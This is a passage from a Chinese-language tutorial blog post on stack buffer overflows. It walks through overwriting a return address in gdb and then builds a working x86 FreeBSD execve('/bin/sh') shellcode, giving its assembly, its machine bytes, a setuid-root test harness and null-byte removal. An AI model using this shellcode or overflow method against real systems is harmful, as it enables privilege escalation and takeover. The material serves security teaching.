<h2 id="4-栈与内存空间"><a href="#4-栈与内存空间" class="headerlink" title="4.栈与内存空间"></a>4.栈与内存空间</h2><h3 id="1-栈中存入数据"><a href="#1-栈中存入数据" class="headerlink" title="1.栈中存入数据"></a>1.栈中存入数据</h3><p><img src="/2018/07/06/缓冲区溢出及防御/1.png" alt="1"></p>
<p>最开始先建设栈起点（基地址）bffff6fc（ebp=esp）。现在bffff6fc存有0x01，来看一下esp，ebp，bffff6fc值。</p>
<p><img src="/2018/07/06/缓冲区溢出及防御/2.png" alt="2"></p>
<p>现在push 0x02。观察栈变化。将 0x02~0x05 的值按顺序 push 时栈的状态。</p>
<p><img src="/2018/07/06/缓冲区溢出及防御/3.png" alt="3"></p>
<p>栈往后（向低地址递减方向）增长，不断执行push，push值不断被存入更靠前的内存地址。esp寄存器中则保存了最新入栈的内存地址。</p>
<h3 id="2-从栈中取出数据"><a href="#2-从栈中取出数据" class="headerlink" title="2.从栈中取出数据"></a>2.从栈中取出数据</h3><p>pop指令会从栈的最低位地址取出一条数据，栈最低位地址为栈的栈顶（esp）。</p>
<p><img src="/2018/07/06/缓冲区溢出及防御/4.png" alt="4"></p>
<p>pop eax，eax中会被存入0x05。 esp也从bffff6ec变为bffff6f0再到bffff6f4。</p>
<p><img src="/2018/07/06/缓冲区溢出及防御/5.png" alt="5"></p>
<p>LIFO（Last In ,First Out）:后进先出 即为栈。</p>
<h2 id="5-攻击者执行任意代码"><a href="#5-攻击者执行任意代码" class="headerlink" title="5.攻击者执行任意代码"></a>5.攻击者执行任意代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sample4.c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">8</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    func(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -S sample4.c</span><br></pre></td></tr></table></figure>
<p>sample4.c 编译加上-s 选项进行编译，生成sample.s文件，为sample4.c的汇编代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">.file   &quot;sample4.c&quot;</span><br><span class="line">    .text</span><br><span class="line">    .p2align 4,,15</span><br><span class="line">.globl func</span><br><span class="line">    .type   func, @function</span><br><span class="line">func:</span><br><span class="line">    pushl   %ebp          保存ebp</span><br><span class="line">    movl    %esp, %ebp    将ebp移动到esp的位置</span><br><span class="line">    subl    $16, %esp</span><br><span class="line">    leave                 恢复ebp和esp</span><br><span class="line">    ret                   跳转到调用该函数的位置</span><br><span class="line">    .size   func, .-func</span><br><span class="line">    .p2align 4,,15</span><br><span class="line">.globl main</span><br><span class="line">    .type   main, @function</span><br><span class="line">main:</span><br><span class="line">    leal    4(%esp), %ecx</span><br><span class="line">    andl    $-16, %esp</span><br><span class="line">    pushl   -4(%ecx)</span><br><span class="line">    pushl   %ebp</span><br><span class="line">    movl    %esp, %ebp</span><br><span class="line">    pushl   %ecx</span><br><span class="line">    subl    $12, %esp</span><br><span class="line">    movl    $3, 8(%esp)   第3参数</span><br><span class="line">    movl    $2, 4(%esp)   第2参数</span><br><span class="line">    movl    $1, (%esp)    第1参数</span><br><span class="line">    call    func          调用func函数</span><br><span class="line">    movl    $0, %eax</span><br><span class="line">    addl    $12, %esp</span><br><span class="line">    popl    %ecx</span><br><span class="line">    popl    %ebp</span><br><span class="line">    leal    -4(%ecx), %esp</span><br><span class="line">    ret</span><br><span class="line">    .size   main, .-main</span><br><span class="line">    .ident  &quot;GCC: (GNU) 4.2.2 20070831 prerelease [FreeBSD]&quot;</span><br></pre></td></tr></table></figure>
<p>在c语言中传递int型参数，在汇编语言中需要在 call func 之前存放到栈中。</p>
<h3 id="1-函数调用时入栈的方法1"><a href="#1-函数调用时入栈的方法1" class="headerlink" title="1.函数调用时入栈的方法1"></a>1.函数调用时入栈的方法1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push $3    // esp-=4，将3送入esp+0</span><br><span class="line">push $2    // esp-=4，将2送入esp+0</span><br><span class="line">push $1    // esp-=4，将1送入esp+0</span><br></pre></td></tr></table></figure>
<p>###2.函数调用时入栈的方法2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">subl $12, %esp    // esp-=12</span><br><span class="line">movl $3, 8(%esp)  // 将3送入esp+8</span><br><span class="line">movl $2, 4(%esp)  // 将2送入esp+4</span><br><span class="line">movl $1, (%esp)   // 将1送入esp+0</span><br></pre></td></tr></table></figure>
<p>参数入栈后，call指令调用子程序。</p>
<p>call需要记住调用时当前指令的地址，因此在跳转到子程序的地址之前，需要先将返回地址（ret_addr）push 到栈中。当调用 func 函数时，在跳转到函数起始地址的瞬间，栈的情形如下图所示。</p>
<p><img src="/2018/07/06/缓冲区溢出及防御/6.png" alt="6"></p>
<p>然后程序执行push ebp。esp 递减，为函数内部的局部变量分配内存空间。</p>
<p><img src="/2018/07/06/缓冲区溢出及防御/7.png" alt="7"></p>
<p>如果数据发生溢出，超过原本分配的数组buff的内存空间。数组buff后面的%ebp，ret_addr以及传递给func函数的参数都会被溢出的数据覆盖掉。<strong>ret_addr 存放的是函数逻辑结束后返回 main 函数的目标地址</strong>。如果覆盖了 ret_addr，攻击者就可以让程序跳转到任意地址。如果攻击者事先准备一段代码，然后让程序跳转到这段代码，也就相当于成功攻击了“可执行任意代码的漏洞”。</p>
<h2 id="6-gdb查看程序运行情况"><a href="#6-gdb查看程序运行情况" class="headerlink" title="6.gdb查看程序运行情况"></a>6.gdb查看程序运行情况</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">$ gdb sample3</span><br><span class="line">GNU gdb 6.1.1 [FreeBSD]</span><br><span class="line">(gdb) disas cpy    反汇编cpy</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> cpy:</span><br><span class="line">0x08048540 &lt;cpy+0&gt;:     push   %ebp</span><br><span class="line">0x08048541 &lt;cpy+1&gt;:     mov    %esp,%ebp</span><br><span class="line">0x08048543 &lt;cpy+3&gt;:     sub    <span class="variable">$0x48</span>,%esp</span><br><span class="line">省略</span><br><span class="line">0x080485b0 &lt;cpy+112&gt;:   mov    %eax,(%esp)</span><br><span class="line">0x080485b3 &lt;cpy+115&gt;:   call   0x80483ec &lt;_init+116&gt;</span><br><span class="line">0x080485b8 &lt;cpy+120&gt;:   mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">0x080485bd &lt;cpy+125&gt;:   leave</span><br><span class="line">0x080485be &lt;cpy+126&gt;:   ret 返回到调用该函数的位置</span><br><span class="line">0x080485bf &lt;cpy+127&gt;:   nop</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) b *0x080485be   调用返回前设置断点</span><br><span class="line">Breakpoint 1 at 0x80485be</span><br><span class="line">(gdb) b cpy           在cpy开头设置断点</span><br><span class="line">Breakpoint 2 at 0x8048546</span><br><span class="line">(gdb) r <span class="string">"\`python -c 'print "</span>A<span class="string">"*80'\`"</span> 运行</span><br><span class="line">Starting program:</span><br><span class="line">/usr/home/guest/sample3 <span class="string">"`python -c 'print "</span>A<span class="string">"*80'`"</span></span><br><span class="line">(no debugging symbols found)...</span><br><span class="line">(no debugging symbols found)...</span><br><span class="line">Breakpoint 2, 0x08048546 <span class="keyword">in</span> cpy ()</span><br><span class="line">(gdb) x/8x <span class="variable">$ebp</span>       确认%ebp、ret_addr和参数</span><br><span class="line">0xbfbfebf8:  0xbfbfec08  0x080485e1  0xbfbfedb0  0xbfbfec20</span><br><span class="line">0xbfbfec08:  0xbfbfec38  0x080484b7  0x00000000  0x00000000</span><br><span class="line">(gdb) x/1s 0xbfbfedb0</span><br><span class="line">0xbfbfedb0: <span class="string">'A'</span> &lt;repeats 80 <span class="built_in">times</span>&gt;</span><br><span class="line">(gdb) c              继续运行</span><br><span class="line">Continuing.</span><br><span class="line">0xbfbfebb8</span><br><span class="line">Breakpoint 1, 0x080485be <span class="keyword">in</span> cpy ()</span><br><span class="line">(gdb) x/8x <span class="variable">$esp</span>     ret_addr被改写为0x41414141</span><br><span class="line">0xbfbfebfc:  0x41414141  0x41414141  0x41414141  0xbfbfec00</span><br><span class="line">0xbfbfec0c:  0x080484b7  0x00000000  0x00000000  0xbfbfec38</span><br><span class="line">(gdb) si</span><br><span class="line">0x41414141 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>0xbfbfebf8 的值为 %ebp</strong></li>
<li><strong>0xbfbfebfc 的值为 ret_addr</strong></li>
<li><strong>后面是传递给函数的参数</strong></li>
</ul>
<p>sample3 的 cpy 函数只有一个 str 参数，因此它的位置紧挨着 ret_addr。</p>
<p><img src="/2018/07/06/缓冲区溢出及防御/8.png" alt="8"></p>
<p>在这里，由于 cpy 中定义的 buff 变量溢出，因此后面的内存空间都会被覆盖掉。0xbfbfebfc 的值被改写为 0x41414141，因此当程序运行到 0x080485be 的 ret 指令时，就会跳转到 0x41414141 这个地址，导致 Segmentation fault。如果我们在 buff 中植入一些机器语言指令，然后将返回地址改为这些指令的地址，这样就可以让计算机执行任意代码了。</p>
<h2 id="7-攻击代码"><a href="#7-攻击代码" class="headerlink" title="7.攻击代码"></a>7.攻击代码</h2><p>攻击者要执行的代码叫做shellcode。一般来说，只要启动了/bin/sh，攻击者就能够完全控制计算机，因此shellcode就是一段非常短小的机器语言代码。功能是启动/bin/sh。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sample5.c 能启动/bin/sh的程序</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *data[<span class="number">2</span>]; <span class="comment">//声明char型的指针数组。</span></span><br><span class="line">    cahr sh[]=<span class="string">"/bin/sh"</span>;</span><br><span class="line">    data[<span class="number">0</span>]=sh; <span class="comment">//存入/bin/sh字符串的指针</span></span><br><span class="line">    data[<span class="number">1</span>]=<span class="literal">NULL</span>; <span class="comment">//存入NULL</span></span><br><span class="line">    execve(sh,data,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//参数为以下3个：/bin/sh字符串的指针，包含传递给程序的参数在内的数组的地址，环境变量。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 在/bin/sh不需要参数，因此data中只存放了/bin/sh字符串的指针。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ su</span><br><span class="line">Password:</span><br><span class="line"><span class="comment"># gcc -Wall -static sample5.c -o sample5</span></span><br><span class="line"><span class="comment"># chmod 4755 sample5</span></span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">$ ./sample5</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>由于sample5 采用静态链接编译的，因此execve本身也位于可执行文件内部。用gdb对execve进行反汇编，可以发现其中调用了int $0x80。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ gdb sample5</span><br><span class="line">GNU gdb 6.1.1 [FreeBSD]</span><br><span class="line">(gdb) disas execve</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> execve:</span><br><span class="line">0x080484f4 &lt;execve+0&gt;:  mov    <span class="variable">$0x3b</span>,%eax</span><br><span class="line">0x080484f9 &lt;execve+5&gt;:  int    <span class="variable">$0x80</span> 系统调用</span><br><span class="line">0x080484fb &lt;execve+7&gt;:  jb     0x80484ec &lt;_set_tp+12&gt;</span><br><span class="line">0x080484fd &lt;execve+9&gt;:  ret</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
<p>mov $0x3b,%eax 指令，它的功能是将 0x3b 存入 eax 寄存器。实际上，这个值是 execve 系统调用的编号，系统内核会根据这个编号来识别不同的系统调用。由于系统调用的编号在各个环境中是不同的，因此在制作 shellcode 的时候需要特别注意。换句话说，每一种操作系统上的 shellcode 都各不相同，因此需要为每种环境都制作相应的 shellcode。(Metasploit工具，通过它自动生成shellcode)。</p>
<h2 id="8-生成可用作shellcode的机器语言代码"><a href="#8-生成可用作shellcode的机器语言代码" class="headerlink" title="8.生成可用作shellcode的机器语言代码"></a>8.生成可用作shellcode的机器语言代码</h2><p>根据sample5来生成可用作shellcode的机器语言代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">$ gdb sample5</span><br><span class="line">GNU gdb 6.1.1 [FreeBSD]</span><br><span class="line">(gdb) disas main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">0x08048210 &lt;main+0&gt;:    lea    0x4(%esp),%ecx</span><br><span class="line">0x08048214 &lt;main+4&gt;:    and    $0xfffffff0,%esp</span><br><span class="line">0x08048217 &lt;main+7&gt;:    pushl  0xfffffffc(%ecx)</span><br><span class="line">0x0804821a &lt;main+10&gt;:   push   %ebp</span><br><span class="line">0x0804821b &lt;main+11&gt;:   mov    %esp,%ebp</span><br><span class="line">0x0804821d &lt;main+13&gt;:   push   %ecx</span><br><span class="line">0x0804821e &lt;main+14&gt;:   sub    $0x24,%esp</span><br><span class="line">0x08048221 &lt;main+17&gt;:   mov    0x806cdd8,%eax</span><br><span class="line">0x08048226 &lt;main+22&gt;:   mov    0x806cddc,%edx</span><br><span class="line">0x0804822c &lt;main+28&gt;:   mov    %eax,0xffffffec(%ebp)</span><br><span class="line">0x0804822f &lt;main+31&gt;:   mov    %edx,0xfffffff0(%ebp)</span><br><span class="line">0x08048232 &lt;main+34&gt;:   lea    0xffffffec(%ebp),%eax</span><br><span class="line">0x08048235 &lt;main+37&gt;:   mov    %eax,0xfffffff4(%ebp)</span><br><span class="line">0x08048238 &lt;main+40&gt;:   movl   $0x0,0xfffffff8(%ebp)</span><br><span class="line">0x0804823f &lt;main+47&gt;:   movl   $0x0,0x8(%esp)       第3参数</span><br><span class="line">0x08048247 &lt;main+55&gt;:   lea    0xfffffff4(%ebp),%eax</span><br><span class="line">0x0804824a &lt;main+58&gt;:   mov    %eax,0x4(%esp)       第2参数</span><br><span class="line">0x0804824e &lt;main+62&gt;:   lea    0xffffffec(%ebp),%eax</span><br><span class="line">0x08048251 &lt;main+65&gt;:   mov    %eax,(%esp)          第1参数</span><br><span class="line">0x08048254 &lt;main+68&gt;:   call   0x80484f4 &lt;execve&gt;   调用execve</span><br><span class="line">0x08048259 &lt;main+73&gt;:   mov    $0x0,%eax</span><br><span class="line">0x0804825e &lt;main+78&gt;:   add    $0x24,%esp</span><br><span class="line">0x08048261 &lt;main+81&gt;:   pop    %ecx</span><br><span class="line">0x08048262 &lt;main+82&gt;:   pop    %ebp</span><br><span class="line">0x08048263 &lt;main+83&gt;:   lea    0xfffffffc(%ecx),%esp</span><br><span class="line">0x08048266 &lt;main+86&gt;:   ret</span><br><span class="line">(gdb) b *0x08048254</span><br><span class="line">Breakpoint 1 at 0x8048254</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /usr/home/guest/sample5</span><br><span class="line">Breakpoint 1, 0x08048254 in main ()</span><br><span class="line">(gdb) x/8x $esp          确认execve的参数</span><br><span class="line">0xbfbfec40:  0xbfbfec54  0xbfbfec5c  0x00000000  0x00000001</span><br><span class="line">0xbfbfec50:  0x00000025  0x6e69622f  0x0068732f  0xbfbfec54</span><br><span class="line">(gdb) x/1s 0xbfbfec54    sh = &quot;/bin/sh&quot;</span><br><span class="line">0xbfbfec54:  &quot;/bin/sh&quot;</span><br><span class="line">(gdb) x/2x 0xbfbfec5c    data</span><br><span class="line">0xbfbfec5c:  0xbfbfec54    data[0] = &quot;/bin/sh&quot;</span><br><span class="line">             0x00000000    data[1] = NULL</span><br></pre></td></tr></table></figure>
<p>execve 需要三个参数，分别如下。</p>
<ul>
<li>第 1 参数：0xbfbfec54（/bin/sh 的地址） </li>
<li>第 2 参数：0xbfbfec5c（/bin/sh 的地址以及内容为 NULL 的数组） </li>
<li>第 3 参数：0x00000000（NULL）</li>
</ul>
<p>0xbfbfec4c和0xbfbfec50的值与execve的调用无关，因此可以删掉。</p>
<p>然后编写一段汇编语言程序，将上述数据写入栈当前esp以后的位置，并调用execve。</p>
<p>sample6.s会向栈中写入调用execve所需的数据，然后执行int $0x80。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">;sample6.s</span><br><span class="line">.globl main</span><br><span class="line">main:</span><br><span class="line">	xorl  %eax, %eax</span><br><span class="line">    pushl %eax        data[1]（NULL）</span><br><span class="line">    movl  %esp, %eax</span><br><span class="line">    subl  $0x0c,%eax</span><br><span class="line">    pushl %eax        data[0]（/bin/sh的地址）</span><br><span class="line">    movl  %esp, %ebx</span><br><span class="line">    pushl $0x0068732f 字符串”/sh\0”</span><br><span class="line">    pushl $0x6e69622f 字符串”/bin”</span><br><span class="line">    movl  %esp, %edx</span><br><span class="line">    xorl  %eax, %eax</span><br><span class="line">    pushl %eax        第3参数</span><br><span class="line">    pushl %ebx        第2参数</span><br><span class="line">    pushl %edx        第1参数</span><br><span class="line">    pushl %eax        call的返回地址（可以为任意值）</span><br><span class="line">    movb  $0x3b, %al</span><br><span class="line">    int   $0x80</span><br></pre></td></tr></table></figure>
<p>用objdump将上面的代码转换为机器语言。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -Wall sample6.s -o sample6</span><br><span class="line">$ objdump -d sample6|grep \&lt;main\&gt;\: -A 16</span><br><span class="line">080483c4 &lt;main&gt;:</span><br><span class="line"> 80483c4:   31 c0            xor    %eax,%eax</span><br><span class="line"> 80483c6:   50               push   %eax</span><br><span class="line"> 80483c7:   89 e0            mov    %esp,%eax</span><br><span class="line"> 80483c9:   83 e8 0c         sub    $0xc,%eax</span><br><span class="line"> 80483cc:   50               push   %eax</span><br><span class="line"> 80483cd:   89 e3            mov    %esp,%ebx</span><br><span class="line"> 80483cf:   68 2f 73 68 00   push   $0x68732f</span><br><span class="line"> 80483d4:   68 2f 62 69 6e   push   $0x6e69622f</span><br><span class="line"> 80483d9:   89 e2            mov    %esp,%edx</span><br><span class="line"> 80483db:   31 c0            xor    %eax,%eax</span><br><span class="line"> 80483dd:   50               push   %eax</span><br><span class="line"> 80483de:   53               push   %ebx</span><br><span class="line"> 80483df:   52               push   %edx</span><br><span class="line"> 80483e0:   50               push   %eax</span><br><span class="line"> 80483e1:   b0 3b            mov    $0x3b,%al</span><br><span class="line"> 80483e3:   cd 80            int    $0x80</span><br></pre></td></tr></table></figure>
<p>然后需要确认以下这段机器语言代码到底能不能发挥shellcode的功能。利用输出的机器语言代码编写下面的程序。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sample7.c</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = &#123;</span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0xc0</span>,                   <span class="comment">// xor %eax, %eax</span></span><br><span class="line">    <span class="number">0x50</span>,                         <span class="comment">// push %eax</span></span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0xe0</span>,                   <span class="comment">// mov %esp, %eax</span></span><br><span class="line">    <span class="number">0x83</span>, <span class="number">0xe8</span>, <span class="number">0x0c</span>,             <span class="comment">// sub $0x0c, %eax</span></span><br><span class="line">    <span class="number">0x50</span>,                         <span class="comment">// push %eax</span></span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0xe3</span>,                   <span class="comment">// mov %esp, %ebx</span></span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="comment">// push $0x68732f</span></span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="comment">// push $0x6e69622f</span></span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0xe2</span>,                   <span class="comment">// mov %esp, %edx</span></span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0xc0</span>,                   <span class="comment">// xor %eax, %eax</span></span><br><span class="line">    <span class="number">0x50</span>,                         <span class="comment">// push %eax</span></span><br><span class="line">    <span class="number">0x53</span>,                         <span class="comment">// push %ebx</span></span><br><span class="line">    <span class="number">0x52</span>,                         <span class="comment">// push %edx</span></span><br><span class="line">    <span class="number">0x50</span>,                         <span class="comment">// push %eax</span></span><br><span class="line">    <span class="number">0xb0</span>, <span class="number">0x3b</span>,                   <span class="comment">// mov $0x3b, %al</span></span><br><span class="line">    <span class="number">0xcd</span>, <span class="number">0x80</span>,                   <span class="comment">// int $0x80</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> (*p)(<span class="keyword">void</span>);</span><br><span class="line">    p = (<span class="keyword">void</span>(*)())shellcode;</span><br><span class="line">    p();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>then，运行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ su</span><br><span class="line">Password:</span><br><span class="line"><span class="comment"># gcc sample7.c -o sample7</span></span><br><span class="line"><span class="comment"># chmod 4755 sample7</span></span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">$ ./sample7</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>只需要将这段机器语言代码嵌入目标程序并让设法让其执行，就能夺取系统的权限了。</p>
<h2 id="10-0x00的改进"><a href="#10-0x00的改进" class="headerlink" title="10 .0x00的改进"></a>10 .0x00的改进</h2><p>上面的shellcode无法对sample3进行攻击，因为里面出现了0x00。在sample3中，复制数据的时候，使用strcpy函数，这个函数用0x00来判断字符串的结尾。当shellcode中间出现0x00时，strcpy就无法完整地复制shellcode的数据。故需要对shellcode加工。</p>
<p>在sample6中，对字符串/sh\0进行push的地方出现了0x00。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">80483cf:   68 2f 73 68 00   push   $0x68732f</span><br><span class="line">80483d4:   68 2f 62 69 6e   push   $0x6e69622f</span><br></pre></td></tr></table></figure>
<p>需要采取下面的方法：</p>
<ul>
<li>将 /bin/sh 改为 /bin//sh 以凑齐 8 个字节 </li>
<li>在前面先 push $0</li>
</ul>
<p>（可以将 /sh\0 改为 //sh，这样就可以消灭了 push 里面的 0x00。之后，采取xor[两个完全意义的值进行xor运算之后会得到0x00]，然后push，可避免直接写入0x00；）</p>
